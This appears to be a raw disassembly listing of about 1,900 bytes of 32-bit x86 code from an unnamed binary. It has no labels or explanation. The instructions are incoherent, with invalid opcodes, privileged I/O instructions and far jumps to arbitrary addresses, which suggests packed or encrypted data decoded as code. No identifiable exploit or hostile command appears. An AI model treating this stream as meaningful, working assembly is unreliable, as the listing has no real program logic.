  41f35c:	xor    eax,0xd3c65186
  41f361:	xchg   BYTE PTR [eax+0x5e],dh
  41f364:	in     eax,0x62
  41f366:	mov    BYTE PTR [eax],al
  41f368:	dec    edi
  41f369:	and    cl,BYTE PTR [edx]
  41f36b:	aam    0x12
  41f36d:	call   0x27f6192f
  41f372:	xchg   esp,eax
  41f373:	cmp    DWORD PTR [edi-0x154753ca],ecx
  41f379:	or     al,0xcb
  41f37b:	mov    WORD PTR [ebx-0x5a],ss
  41f37e:	mov    ah,BYTE PTR [ebx]
  41f380:	into   
  41f381:	pop    eax
  41f382:	hlt    
  41f383:	xchg   edi,eax
  41f384:	mov    bl,BYTE PTR [eax+esi*4]
  41f387:	xor    DWORD PTR [eax],ebp
  41f389:	js     0x41f375
  41f38b:	gs std 
  41f38d:	jbe    0x41f337
  41f38f:	xor    BYTE PTR [ebx],cl
  41f391:	call   0x1077:0x413548ff
  41f398:	adc    ch,BYTE PTR [eax+0x29]
  41f39b:	ins    DWORD PTR es:[edi],dx
  41f39c:	sbb    bl,BYTE PTR [edi-0x7]
  41f39f:	bound  esp,QWORD PTR [esi-0x25]
  41f3a2:	out    dx,al
  41f3a3:	aas    
  41f3a4:	rcr    DWORD PTR [ebx-0x24],1
  41f3a7:	rol    al,1
  41f3a9:	or     al,BYTE PTR [eax+0x79d868d3]
  41f3af:	iret   
  41f3b0:	stos   BYTE PTR es:[edi],al
  41f3b1:	(bad)  [ecx+edx*2+0x6a0d2d3]
  41f3b8:	or     BYTE PTR [edx-0x51],cl
  41f3bb:	leave  
  41f3bc:	ja     0x41f3e0
  41f3be:	cmp    ebp,DWORD PTR ss:[edi+0x4c]
  41f3c2:	or     esi,edx
  41f3c4:	xchg   ebp,eax
  41f3c5:	push   edx
  41f3c6:	popf   
  41f3c7:	cmc    
  41f3c8:	out    0x4c,eax
  41f3ca:	js     0x41f361
  41f3cc:	mov    esp,0x4529e1e7
  41f3d1:	pusha  
  41f3d2:	repz sahf 
  41f3d4:	hlt    
  41f3d5:	xchg   esi,eax
  41f3d6:	mov    ebp,0x419b1d7c
  41f3db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3dc:	mov    edx,0x2e875c98
  41f3e1:	mov    ebp,0x81153dc0
  41f3e6:	lods   eax,DWORD PTR ds:[esi]
  41f3e7:	or     al,0x62
  41f3e9:	and    ebp,DWORD PTR [ecx]
  41f3eb:	imul   BYTE PTR [ebx-0x31346798]
  41f3f1:	fld    st(2)
  41f3f3:	push   0xffffffc7
  41f3f5:	addr16 push 0x182e05e
  41f3fb:	and    al,0x70
  41f3fd:	and    ebx,ebp
  41f3ff:	mov    ah,0x51
  41f401:	mov    ah,0xfe
  41f403:	jns    0x41f3d7
  41f405:	dec    eax
  41f406:	xchg   ecx,eax
  41f407:	push   ebx
  41f408:	adc    BYTE PTR [bx+si+0x5ba5],al
  41f40d:	fcmovbe st,st(5)
  41f40f:	mov    edi,DWORD PTR [ebx+0x50cf58e0]
  41f415:	je     0x41f3e7
  41f417:	push   ecx
  41f418:	pop    esi
  41f419:	dec    edx
  41f41a:	call   0xcc9074e0
  41f41f:	xor    esi,DWORD PTR [edi]
  41f421:	or     al,0x5e
  41f423:	inc    ebx
  41f424:	addr16 mov al,0x7c
  41f427:	mov    DWORD PTR [esi+ecx*2],esp
  41f42a:	in     eax,dx
  41f42b:	repnz sbb esi,esi
  41f42e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f42f:	mov    esp,0x992401a0
  41f434:	les    ebx,FWORD PTR [eax-0xae1ebdc]
  41f43a:	icebp  
  41f43b:	nop
  41f43c:	sbb    edi,ebx
  41f43e:	(bad)  
  41f43f:	xchg   esp,eax
  41f440:	mov    ds:0x9d544d02,al
  41f445:	icebp  
  41f446:	sahf   
  41f447:	js     0x41f43f
  41f449:	in     eax,0xbe
  41f44b:	or     DWORD PTR [ebp+ebp*1+0xc],ebx
  41f44f:	xchg   esi,eax
  41f450:	outs   dx,DWORD PTR ds:[esi]
  41f451:	xor    DWORD PTR [ecx+esi*1],edi
  41f454:	jmp    0xe1051a9f
  41f459:	sbb    eax,0x2e464967
  41f45e:	xlat   BYTE PTR ds:[ebx]
  41f45f:	pop    ss
  41f460:	sub    ah,cl
  41f462:	cmp    BYTE PTR [esi-0x1a],al
  41f465:	sub    bl,BYTE PTR [ebp+0x38bdbe88]
  41f46b:	or     ecx,DWORD PTR ds:[ecx+edx*4]
  41f46f:	add    BYTE PTR [esi-0x1c45cb49],bl
  41f475:	(bad)  
  41f476:	xor    DWORD PTR [ebx+0x279afa8e],esi
  41f47c:	sbb    al,0xcb
  41f47e:	push   0xffffffff
  41f480:	je     0x41f4eb
  41f482:	popf   
  41f483:	sti    
  41f484:	jge    0x41f406
  41f486:	adc    ecx,DWORD PTR [ecx+0x34bc9364]
  41f48c:	sub    BYTE PTR [ebp-0x4ad49fd7],bl
  41f492:	aam    0x80
  41f494:	popf   
  41f495:	ja     0x41f46f
  41f497:	ds js  0x41f514
  41f49a:	dec    edx
  41f49b:	jl     0x41f4f0
  41f49d:	mov    ds:0x37ffce7e,eax
  41f4a2:	jge    0x41f4b2
  41f4a4:	inc    ebp
  41f4a5:	push   cs
  41f4a6:	mov    al,ds:0x52c094e3
  41f4ab:	mov    ecx,?
  41f4ad:	adc    edx,ebp
  41f4af:	call   0x98c8:0xba3e4f62
  41f4b6:	mov    WORD PTR [edi],cs
  41f4b8:	add    DWORD PTR [edx],ecx
  41f4ba:	loopne 0x41f521
  41f4bc:	mov    ds,WORD PTR [ebp-0x12]
  41f4bf:	ret    
  41f4c0:	enter  0xf92c,0x2b
  41f4c4:	mov    ebp,0xb5988f52
  41f4c9:	cmc    
  41f4ca:	pusha  
  41f4cb:	cmp    BYTE PTR [esi],0x1e
  41f4ce:	dec    ebx
  41f4cf:	sub    al,0xb
  41f4d1:	sub    al,0xd5
  41f4d3:	jae    0x41f554
  41f4d5:	aam    0xaf
  41f4d7:	jmp    0x39e5:0xb1ab059d
  41f4de:	arpl   WORD PTR [edi-0x1fec85cc],si
  41f4e4:	mov    al,0x4b
  41f4e6:	cli    
  41f4e7:	test   eax,0x604669c
  41f4ec:	sbb    bh,BYTE PTR ss:[ebx]
  41f4ef:	arpl   bx,sp
  41f4f1:	cs in  al,dx
  41f4f3:	push   esi
  41f4f4:	cmc    
  41f4f5:	call   0x4f8b:0xa5e217ef
  41f4fc:	and    esi,DWORD PTR [ebp-0x7d]
  41f4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f500:	fld    QWORD PTR [edi]
  41f502:	std    
  41f503:	or     al,BYTE PTR [ecx-0x74]
  41f506:	mul    esp
  41f508:	xchg   ebp,eax
  41f509:	(bad)  
  41f50a:	in     al,0xd6
  41f50c:	xchg   ecx,eax
  41f50d:	in     eax,dx
  41f50e:	stos   BYTE PTR es:[edi],al
  41f50f:	les    ecx,FWORD PTR [ecx]
  41f511:	adc    DWORD PTR [ebp+eax*2+0x5eb94390],0xacdcd990
  41f51c:	cmc    
  41f51d:	cmp    edi,DWORD PTR [ecx+0x75]
  41f520:	cmc    
  41f521:	hlt    
  41f522:	push   es
  41f523:	scas   eax,DWORD PTR es:[edi]
  41f524:	fnstcw WORD PTR [esi+0x55]
  41f527:	jno    0x41f4d8
  41f529:	adc    cl,ch
  41f52b:	cli    
  41f52c:	aas    
  41f52d:	or     al,0xf7
  41f52f:	mov    edx,0x5ebcf477
  41f534:	jle    0x41f53c
  41f536:	xlat   BYTE PTR ds:[ebx]
  41f537:	gs repnz dec ebp
  41f53a:	mov    BYTE PTR [ecx+eax*8],dl
  41f53d:	lds    ebx,FWORD PTR [edx+0x11000016]
  41f543:	push   cs
  41f544:	or     dl,ch
  41f546:	pop    ds
  41f547:	out    dx,al
  41f548:	repz jmp FWORD PTR [edi-0xd30fbda]
  41f54f:	sub    cl,bl
  41f551:	sbb    al,0x52
  41f553:	imul   eax,DWORD PTR [ecx],0x0
  41f556:	add    eax,DWORD PTR es:[eax]
  41f559:	add    BYTE PTR [ebx+edx*4+0x2e],bh
  41f55d:	lds    esp,FWORD PTR [ecx+0x6d]
  41f560:	repz xor BYTE PTR ds:0xd1d25822,0x95
  41f568:	pushf  
  41f569:	pushf  
  41f56a:	or     DWORD PTR [edi-0x6d306809],ecx
  41f570:	mov    WORD PTR [edx-0x26],es
  41f573:	cmc    
  41f574:	mov    ecx,0xf6cf5d52
  41f579:	cmp    BYTE PTR [edx+0x6ca6cf],0x23
  41f580:	pop    eax
  41f581:	leave  
  41f582:	sub    BYTE PTR [ebx-0x5e0f26b6],dh
  41f588:	xor    ch,0x3e
  41f58b:	add    DWORD PTR [ecx-0x3c],ebp
  41f58e:	fsubr  DWORD PTR [esi]
  41f590:	mov    fs,WORD PTR [edx-0x66040ffd]
  41f596:	and    ch,0xff
  41f599:	xchg   edi,eax
  41f59a:	pusha  
  41f59b:	mov    al,ds:0x1b071001
  41f5a0:	sub    DWORD PTR [edi-0x23303506],ebp
  41f5a6:	add    dl,BYTE PTR [edi+0x53]
  41f5a9:	adc    edx,DWORD PTR [eax+0x3d]
  41f5ac:	mov    ds:0x7e4f0a60,eax
  41f5b1:	sbb    BYTE PTR [edx-0x4142ce2e],dl
  41f5b7:	arpl   WORD PTR [ebp+0x78b206b4],bp
  41f5bd:	js     0x41f628
  41f5bf:	lahf   
  41f5c0:	mov    edx,0x7a62e295
  41f5c5:	neg    DWORD PTR [edx+0x5b]
  41f5c8:	fsub   QWORD PTR [ebx+ebx*2]
  41f5cb:	xchg   BYTE PTR [ebx],dl
  41f5cd:	imul   edx,ebp,0x8b6a9306
  41f5d3:	mov    bh,0xba
  41f5d5:	mov    ecx,DWORD PTR [esi-0x2c]
  41f5d8:	lds    ecx,FWORD PTR ds:0x980eb2e8
  41f5de:	pushf  
  41f5df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5e0:	or     ebx,DWORD PTR [ebp+0x4c]
  41f5e3:	jno    0x41f5ca
  41f5e5:	loopne 0x41f5bd
  41f5e7:	ins    DWORD PTR es:[edi],dx
  41f5e8:	lods   eax,DWORD PTR ds:[esi]
  41f5e9:	out    dx,eax
  41f5ea:	fcom   QWORD PTR [ebp-0x66]
  41f5ed:	inc    edx
  41f5ee:	jecxz  0x41f65d
  41f5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5f1:	pop    ebx
  41f5f2:	sub    bl,bh
  41f5f4:	xor    esi,esp
  41f5f6:	lods   eax,DWORD PTR ds:[esi]
  41f5f7:	jecxz  0x41f618
  41f5f9:	into   
  41f5fa:	mov    cl,0xf5
  41f5fc:	jge    0x41f5e2
  41f5fe:	inc    ecx
  41f5ff:	xor    edi,DWORD PTR [ecx-0x70]
  41f602:	jmp    0x41f60c
  41f604:	(bad)  
  41f605:	mov    eax,0x6df118de
  41f60a:	outs   dx,BYTE PTR ds:[esi]
  41f60b:	mov    ch,0x73
  41f60d:	xor    ch,BYTE PTR [ebx-0x59d8ee5a]
  41f613:	scas   al,BYTE PTR es:[edi]
  41f614:	test   al,0x2e
  41f616:	add    eax,0xa4d6f724
  41f61b:	or     edx,ebp
  41f61d:	xor    BYTE PTR [edx],dl
  41f61f:	(bad)
  41f622:	sti    
  41f623:	push   0xbaecdbf5
  41f628:	(bad)  
  41f629:	mov    dh,0x29
  41f62b:	and    eax,0x419abe4c
  41f630:	aam    0x1e
  41f632:	mov    ecx,0x72013f0d
  41f637:	ror    BYTE PTR [eax+eax*1],cl
  41f63a:	xor    bl,BYTE PTR ds:0xc483c950
  41f640:	jp     0x41f60d
  41f642:	test   DWORD PTR [ebp+0x78bbebd2],ecx
  41f648:	das    
  41f649:	and    eax,0x784c970
  41f64e:	cmp    cl,ah
  41f650:	pop    ebx
  41f651:	test   dh,ch
  41f653:	add    al,0xef
  41f655:	xor    ebx,eax
  41f657:	rol    DWORD PTR [esi],cl
  41f659:	jne    0x41f617
  41f65b:	sahf   
  41f65c:	sar    DWORD PTR [edx-0x7bc8fa46],0x3a
  41f663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f664:	ret    
  41f665:	dec    ecx
  41f666:	shl    BYTE PTR [eax+ebx*1],0xb7
  41f66a:	jb     0x41f67e
  41f66c:	jb     0x41f628
  41f66e:	xor    ecx,0x44
  41f671:	push   eax
  41f672:	and    BYTE PTR [ecx-0x2c],ch
  41f675:	jmp    0xd2ea9479
  41f67a:	loopne 0x41f6f2
  41f67c:	loop   0x41f613
  41f67e:	sbb    esi,DWORD PTR ds:0x2c691143
  41f684:	and    BYTE PTR [ecx],ah
  41f686:	xor    ch,ch
  41f688:	aaa    
  41f689:	stos   DWORD PTR es:[edi],eax
  41f68a:	loopne 0x41f697
  41f68c:	dec    eax
  41f68d:	xor    DWORD PTR [ebx],edx
  41f68f:	test   al,0xe4
  41f691:	jbe    0x41f6bc
  41f693:	push   ebx
  41f694:	(bad)  
  41f695:	jge    0x41f62e
  41f697:	push   0x9517d6dc
  41f69c:	je     0x41f665
  41f69e:	fmul   DWORD PTR [eax+0x77f6fc7d]
  41f6a4:	pop    esi
  41f6a5:	fiadd  DWORD PTR [edi-0x8b42a06]
  41f6ab:	sub    ah,cl
  41f6ad:	xchg   ecx,eax
  41f6ae:	dec    edi
  41f6af:	mov    ah,0xf7
  41f6b1:	adc    al,BYTE PTR ds:0x9ccc3689
  41f6b7:	jns    0x41f6b4
  41f6b9:	fsubr  QWORD PTR [edi-0x3c]
  41f6bc:	dec    esp
  41f6bd:	aaa    
  41f6be:	and    eax,0x4d7110b0
  41f6c3:	mov    eax,ebx
  41f6c5:	xor    BYTE PTR [ebp+0x4c4fd5c],bl
  41f6cb:	cmc    
  41f6cc:	pop    ecx
  41f6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6ce:	dec    edi
  41f6cf:	icebp  
  41f6d0:	jmp    0x97927e9a
  41f6d5:	dec    edi
  41f6d6:	and    dh,BYTE PTR [ecx]
  41f6d8:	test   eax,0x888648e6
  41f6dd:	pushw  ds
  41f6df:	jb     0x41f6a6
  41f6e1:	ins    BYTE PTR es:[edi],dx
  41f6e2:	or     ah,bh
  41f6e4:	push   edx
  41f6e5:	xor    BYTE PTR [eax],cl
  41f6e7:	fsubp  st(3),st
  41f6e9:	push   esi
  41f6ea:	fsub   st,st(7)
  41f6ec:	mov    ch,0x94
  41f6ee:	pop    ebp
  41f6f0:	jnp    0x41f6dd
  41f6f2:	iret   
  41f6f3:	mov    dl,0xd9
  41f6f5:	xor    al,0xbd
  41f6f7:	jg     0x41f726
  41f6f9:	and    eax,0xf9ad4786
  41f6fe:	rcr    DWORD PTR [edx-0x795620f8],1
  41f704:	ret    0xff18
  41f707:	and    al,0x18
  41f709:	and    al,0x8e
  41f70b:	retf   0x4bd7
  41f70e:	jp     0x41f77c
  41f710:	jg     0x41f73d
  41f712:	add    esp,DWORD PTR [ebx]
  41f714:	push   0x30
  41f716:	imul   ebx,ebx,0xffffffa6
  41f719:	retf   0x33f3
  41f71c:	lods   al,BYTE PTR ds:[esi]
  41f71d:	fdivr  DWORD PTR ds:[esi-0xf]
  41f721:	outs   dx,DWORD PTR ds:[esi]
  41f722:	jp     0x41f713
  41f724:	xchg   ebx,eax
  41f725:	xchg   ebp,eax
  41f726:	outs   dx,DWORD PTR ds:[esi]
  41f727:	test   edx,0xeaf3946e
  41f72d:	(bad)  [ecx]
  41f72f:	dec    edx
  41f730:	in     eax,0x94
  41f732:	add    esi,DWORD PTR [edi+0xe]
  41f735:	test   eax,0x57e3ecb9
  41f73a:	shl    al,1
  41f73c:	mov    ebx,esi
  41f73e:	pop    ebx
  41f73f:	lahf   
  41f740:	leave  
  41f741:	outs   dx,DWORD PTR ds:[esi]
  41f742:	xchg   ebx,eax
  41f743:	adc    eax,0xb8622d51
  41f748:	inc    esi
  41f749:	pop    eax
  41f74a:	xchg   ecx,eax
  41f74b:	data16 sub dh,bh
  41f74e:	ret    0x2219
  41f751:	scas   eax,DWORD PTR es:[edi]
  41f752:	fstp   DWORD PTR [ebx]
  41f754:	lods   al,BYTE PTR es:[esi]
  41f756:	inc    ebp
  41f757:	jno    0x41f703
  41f759:	dec    ebp
  41f75a:	in     al,0x78
  41f75c:	sbb    DWORD PTR ss:[ebp+0x68f1c957],esi
  41f763:	push   esi
  41f764:	fisttp DWORD PTR [ebx+0x233298c]
  41f76a:	jnp    0x41f710
  41f76c:	xor    BYTE PTR [ecx-0x7d],bl
  41f76f:	cmp    ah,BYTE PTR [edx+eiz*2+0x49938f4d]
  41f776:	or     al,0x90
  41f778:	inc    DWORD PTR [edx]
  41f77a:	test   DWORD PTR [eax],edi
  41f77c:	xor    edx,DWORD PTR [edi+0x24]
  41f77f:	xchg   edi,eax
  41f780:	popa   
  41f781:	sub    eax,0x540953a7
  41f786:	int3   
  41f787:	and    BYTE PTR [ecx+esi*4-0x18333ace],bh
  41f78e:	neg    BYTE PTR [ecx+ebp*1-0x6]
  41f792:	cmp    al,0xfc
  41f794:	cmp    DWORD PTR [ebx+0x2cbe8181],0xfffffff4
  41f79b:	ins    BYTE PTR es:[edi],dx
  41f79c:	retf   
  41f79d:	int    0xe5
  41f79f:	ja     0x41f793
  41f7a1:	and    ebp,DWORD PTR [edi+0x590981b9]
  41f7a7:	cmc    
  41f7a8:	mov    edi,0x9ae61cda
  41f7ad:	in     al,dx
  41f7ae:	xor    dh,cl
  41f7b0:	pushf  
  41f7b1:	rcl    DWORD PTR [ebx-0x32],0x5d
  41f7b5:	pop    edx
  41f7b6:	shl    DWORD PTR [esi-0x38],1
  41f7b9:	mov    bh,0x4a
  41f7bb:	dec    esp
  41f7bc:	add    eax,0x514ff85c
  41f7c1:	mov    BYTE PTR [eax+0x79],ch
  41f7c4:	push   cs
  41f7c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7c6:	(bad)  
  41f7c7:	(bad)  
  41f7c8:	cli    
  41f7c9:	cmp    BYTE PTR ds:0xde46ce8b,0xb7
  41f7d0:	ins    DWORD PTR es:[edi],dx
  41f7d1:	jg     0x41f7da
  41f7d3:	inc    edx
  41f7d4:	sbb    BYTE PTR [esi-0x687ed4ff],dl
  41f7da:	fisttp WORD PTR [ebp-0x2d]
  41f7dd:	add    dh,BYTE PTR [ecx]
  41f7df:	mov    dl,0x58
  41f7e1:	imul   ebx,DWORD PTR [ebx+0x1bf62332],0xffffff84
  41f7e8:	lahf   
  41f7e9:	and    al,0x67
  41f7eb:	pushf  
  41f7ec:	mov    ds:0x19ce5ea7,al
  41f7f1:	sub    DWORD PTR [eax-0x1086f1f9],0x56b1c673
  41f7fb:	les    edi,FWORD PTR [esp+eiz*2+0x69]
  41f7ff:	imul   ebp,DWORD PTR [ebx+0x333a8bcb],0x17
  41f806:	mov    ecx,0x5a2625dd
  41f80b:	pusha  
  41f80c:	inc    esp
  41f80d:	xchg   DWORD PTR [ebx-0xaa4fc42],edx
  41f813:	shr    BYTE PTR [ecx-0x6d1dc1d1],1
  41f819:	out    0x2e,al
  41f81b:	mov    ds:0xbd4e6882,eax
  41f820:	rcl    BYTE PTR ds:0x244913ef,0x84
  41f827:	xor    DWORD PTR [esi],edi
  41f829:	push   0xffffffab
  41f82b:	iret   
  41f82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f82d:	xor    esi,DWORD PTR gs:[eax+0x13]
  41f831:	mov    ecx,0x6d62e4f0
  41f836:	xor    eax,0x3976e19a
  41f83b:	cs out dx,eax
  41f83d:	mov    esp,0x3c174908
  41f842:	enter  0x2d90,0x94
  41f846:	sbb    eax,0xb00fa098
  41f84b:	pop    ds
  41f84c:	sub    BYTE PTR [ecx-0x73],cl
  41f84f:	pop    eax
  41f850:	pusha  
  41f851:	or     ebp,ecx
  41f853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f854:	gs fs dec ebp
  41f857:	out    dx,al
  41f858:	and    eax,0x8dea18ba
  41f85d:	sbb    al,0xb4
  41f85f:	xchg   esp,eax
  41f860:	pop    ebp
  41f861:	xchg   esi,eax
  41f862:	fnstenv [eax-0x4f]
  41f865:	imul   edi,DWORD PTR cs:[esi-0x75],0xece11985
  41f86d:	push   cs
  41f86e:	mov    BYTE PTR [edi+0x15b6bb3f],bh
  41f874:	aaa    
  41f875:	cli    
  41f876:	add    al,0x8
  41f878:	js     0x41f875
  41f87a:	in     eax,dx
  41f87b:	(bad)  [ebp+0x8e4931]
  41f881:	add    cl,cl
  41f883:	xchg   esi,eax
  41f884:	ins    DWORD PTR es:[edi],dx
  41f885:	mov    dh,0x7f
  41f887:	(bad)  
  41f888:	(bad)  
  41f88a:	aam    0xd9
  41f88c:	inc    ebx
  41f88d:	fadd   DWORD PTR [esi+0x7837f126]
  41f893:	outs   dx,BYTE PTR ds:[esi]
  41f894:	add    DWORD PTR [eax],eax
  41f896:	add    eax,DWORD PTR es:[eax]
  41f899:	add    BYTE PTR [ebp+0x12806cca],dl
  41f89f:	nop
  41f8a0:	in     al,0x4d
  41f8a2:	js     0x41f84e
  41f8a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8a5:	lahf   
  41f8a6:	xlat   BYTE PTR ds:[ebx]
  41f8a7:	push   esp
  41f8a8:	push   edi
  41f8a9:	les    esp,FWORD PTR [ecx+ebp*1]
  41f8ac:	enter  0x2aad,0x18
  41f8b0:	sbb    eax,0xa253ba17
  41f8b5:	ret    
  41f8b6:	call   0x97066917
  41f8bb:	out    0x33,eax
  41f8bd:	stos   DWORD PTR es:[edi],eax
  41f8be:	xor    al,0x19
  41f8c0:	sub    DWORD PTR [ebp+0x76104649],esi
  41f8c6:	pop    ecx
  41f8c7:	mov    al,0x88
  41f8c9:	aad    0xdc
  41f8cb:	popf   
  41f8cc:	pop    esp
  41f8cd:	pop    esp
  41f8ce:	push   ecx
  41f8cf:	add    eax,0x6832aea2
  41f8d4:	cmp    BYTE PTR [edi+0x4b],0x54
  41f8d8:	pop    ebp
  41f8d9:	std    
  41f8da:	jb     0x41f8bf
  41f8dc:	sbb    BYTE PTR [ecx+0x18],bh
  41f8df:	cmovo  eax,eax
  41f8e2:	scas   eax,DWORD PTR es:[edi]
  41f8e3:	pop    edx
  41f8e4:	fisub  DWORD PTR [esi+0x6e]
  41f8e7:	inc    ebx
  41f8e8:	test   al,0x98
  41f8ea:	pushf  
  41f8eb:	fidiv  DWORD PTR [eax-0x18]
  41f8ee:	mov    ch,0x59
  41f8f0:	(bad)  
  41f8f1:	in     eax,dx
  41f8f2:	mov    esp,0xd585a397
  41f8f7:	sbb    al,0x43
  41f8f9:	mov    al,0x23
  41f8fb:	mov    eax,0xea9be76b
  41f900:	mov    ebx,0x14c150
  41f905:	mov    esi,0x58fcfe80
  41f90a:	cmp    dh,BYTE PTR [eax+0x613e19a0]
  41f910:	xchg   esp,eax
  41f911:	cmp    eax,0xf8858280
  41f916:	js     0x41f8a7
  41f918:	mov    edi,0x73c60df1
  41f91d:	sbb    BYTE PTR [edx-0x4c],dh
  41f920:	cmovp  edx,DWORD PTR [ebx]
  41f923:	jecxz  0x41f98c
  41f925:	icebp  
  41f926:	xor    eax,0xa60088ff
  41f92b:	sbb    eax,0x66f86805
  41f930:	mov    al,ds:0x6e773717
  41f935:	test   esi,edx
  41f937:	sub    dh,al
  41f939:	sti    
  41f93a:	or     eax,0x218970b7
  41f93f:	dec    edx
  41f940:	adc    DWORD PTR [eax],edx
  41f942:	push   cs
  41f943:	lds    edi,FWORD PTR [ebp+0x42]
  41f946:	call   0x49cdadf9
  41f94b:	ret    
  41f94c:	inc    esp
  41f94d:	lea    esi,[eax+0x4787b79a]
  41f953:	into   
  41f954:	jmp    DWORD PTR [ebp+0x3b5afd66]
  41f95a:	or     esp,DWORD PTR [eax-0x4270e298]
  41f960:	dec    esi
  41f961:	rcr    cl,cl
  41f963:	lea    edx,[ebx-0x5e7be621]
  41f969:	xor    BYTE PTR ds:0x4f6fdb62,ch
  41f96f:	adc    ebx,DWORD PTR [edx+0x2677b9c4]
  41f975:	stos   BYTE PTR es:[edi],al
  41f976:	mov    DWORD PTR [edi-0x5db0a81e],edx
  41f97c:	ror    BYTE PTR [ecx+ecx*8-0x7de0823f],1
  41f983:	push   0xffffffb4
  41f985:	inc    ecx
  41f986:	mov    cl,0xc8
  41f988:	jp     0x41f99d
  41f98a:	(bad)  
  41f98b:	and    eax,0xa897a0a7
  41f990:	lods   eax,DWORD PTR ds:[esi]
  41f991:	pop    edx
  41f992:	xor    BYTE PTR es:[esi-0x607cbe8],ah
  41f999:	loopne 0x41f963
  41f99b:	sti    
  41f99c:	pop    esp
  41f99d:	int    0x54
  41f99f:	xor    eax,0xe4c9485b
  41f9a4:	xchg   bx,ax
  41f9a6:	dec    edx
  41f9a7:	jo     0x41f9d3
  41f9a9:	jg     0x41f9fe
  41f9ab:	je     0x41f9b5
  41f9ad:	cmp    dl,BYTE PTR [edx+0x24]
  41f9b0:	loop   0x41f935
  41f9b2:	mov    ?,WORD PTR [edi]
  41f9b4:	mov    ch,0x3b
  41f9b6:	mov    cl,0x13
  41f9b8:	mov    al,0x64
  41f9ba:	xor    DWORD PTR [edi+0x2],ecx
  41f9bd:	push   eax
  41f9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9bf:	(bad)  [eax+0x17e678f1]
  41f9c5:	cmc    
  41f9c6:	push   edx
  41f9c7:	int3   
  41f9c8:	pop    es
  41f9c9:	sub    al,0x45
  41f9cb:	out    dx,eax
  41f9cc:	stc    
  41f9cd:	add    DWORD PTR [edi+0x42],edi
  41f9d0:	test   eax,0xd859f656
  41f9d5:	or     eax,0x362818cc
  41f9da:	repnz mov ah,0xd1
  41f9dd:	cmp    eax,0xaa57e9c4
  41f9e2:	mov    esi,0x16388db
  41f9e7:	enter  0xa114,0x43
  41f9eb:	std    
  41f9ec:	addr16 cwde 
  41f9ee:	dec    edx
  41f9ef:	push   0xffffffe4
  41f9f1:	mov    bl,0xcb
  41f9f3:	gs dec eax
  41f9f5:	cmp    eax,0xe16ca22c
  41f9fa:	push   ss
  41f9fb:	ins    DWORD PTR es:[edi],dx
  41f9fc:	push   ds
  41f9fd:	std    
  41f9fe:	sub    eax,0xb9c7a14a
  41fa03:	cli    
  41fa04:	std    
  41fa05:	repnz call 0x4d3b:0xef8a51d0
  41fa0d:	nop
  41fa0e:	cs das 
  41fa10:	aas    
  41fa11:	(bad)
  41fa14:	push   esi
  41fa15:	pop    ss
  41fa16:	mov    edx,0xd609a4d
  41fa1b:	fstp   TBYTE PTR [ebp+0x12]
  41fa1e:	xchg   dh,ah
  41fa20:	out    0x41,eax
  41fa22:	push   0x61
  41fa24:	loope  0x41f9e4
  41fa26:	cmp    bh,BYTE PTR [esi]
  41fa28:	jmp    0x41fa8d
  41fa2a:	sub    al,0xfb
  41fa2c:	push   eax
  41fa2d:	ret    
  41fa2e:	or     ecx,DWORD PTR [ebx]
  41fa30:	out    0x97,al
  41fa32:	fimul  WORD PTR [esi+0xb]
  41fa35:	aas    
  41fa36:	clc    
  41fa37:	mov    eax,ds:0xdc1e7241
  41fa3c:	imul   esi,DWORD PTR [edi+0x126a0228],0x852e0ca5
  41fa46:	xor    BYTE PTR [edi],dh
  41fa48:	enter  0xf9b0,0xe1
  41fa4c:	fld    QWORD PTR es:[ebp-0xe]
  41fa50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa51:	(bad)  
  41fa52:	aas    
  41fa53:	jnp    0x41f9d5
  41fa55:	inc    ebx
  41fa56:	in     al,dx
  41fa57:	push   es
  41fa58:	in     eax,0x5f
  41fa5a:	push   es
  41fa5b:	mov    bh,0x5f
  41fa5d:	(bad)  
  41fa5f:	inc    eax
  41fa60:	mov    al,0xbb
  41fa62:	test   al,0xf9
  41fa64:	popf   
  41fa65:	sub    BYTE PTR [ebx],cl
  41fa67:	mov    bh,0xf9
  41fa69:	dec    ebx
  41fa6a:	pop    edx
  41fa6b:	jo     0x41f9f6
  41fa6d:	mov    ds:0xa31658b8,eax
  41fa72:	xchg   edx,eax
  41fa73:	xlat   BYTE PTR ds:[ebx]
  41fa74:	pop    edx
  41fa75:	call   0xfb67:0x1064a5ac
  41fa7c:	jle    0x41fae1
  41fa7e:	lods   eax,DWORD PTR ds:[esi]
  41fa7f:	pushf  
  41fa80:	mov    al,0xe9
  41fa82:	dec    edx
  41fa83:	mov    dh,0xa5
  41fa85:	in     eax,dx
  41fa86:	shl    DWORD PTR [eax-0x2f],cl
  41fa89:	je     0x41faec
  41fa8b:	xor    cl,ch
  41fa8d:	arpl   WORD PTR ds:0x99e79fe2,ax
  41fa93:	imul   ebp,DWORD PTR [edi-0x34419258],0xb7bd5a6f
  41fa9d:	cdq    
  41fa9e:	fst    QWORD PTR [ecx+esi*8-0xb]
  41faa2:	ins    DWORD PTR es:[edi],dx
  41faa3:	adc    BYTE PTR ds:0x6eb9beb9,dl
  41faa9:	inc    edi
  41faaa:	pop    edx
  41faab:	mov    esp,0xde0904ef
  41fab0:	push   edx
  41fab1:	jle    0x41fa3d
  41fab3:	push   esi
  41fab4:	scas   al,BYTE PTR es:[edi]
  41fab5:	mov    dl,0x63
  41fab7:	xor    esp,DWORD PTR [ebx-0x34]
  41faba:	aas    
  41fabb:	pop    ebp
  41fabc:	pusha  
  41fabd:	pop    ds
  41fabe:	push   edi
  41fabf:	xor    eax,0x37fb78d2
  41fac4:	and    eax,0x3ec9c6ff
  41fac9:	jne    0x41fa8e
  41facb:	es aad 0x4b
  41face:	adc    dl,BYTE PTR [edi+0x26]
  41fad1:	das    
  41fad2:	outs   dx,BYTE PTR ds:[esi]
